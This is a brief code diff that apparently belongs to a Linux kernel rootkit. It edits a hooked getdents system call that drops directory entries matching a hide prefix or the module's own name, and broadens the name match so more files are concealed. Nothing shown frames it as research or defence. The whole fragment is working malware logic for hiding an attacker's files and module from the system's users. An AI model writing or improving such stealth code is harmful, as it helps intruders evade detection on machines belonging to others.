@@ -41,7 +41,7 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	for (boff = 0; boff < ret;) {
 		ent = (struct linux_dirent*)(dbuf + boff);
 		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)
-			|| (strncmp(ent->d_name, MODULE_NAME, MODULE_NAME_SZ) == 0)) {
+			|| (strstr(ent->d_name, MODULE_NAME) != NULL)) {
 			// copy forward the rest
 			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
 			ret -= ent->d_reclen;
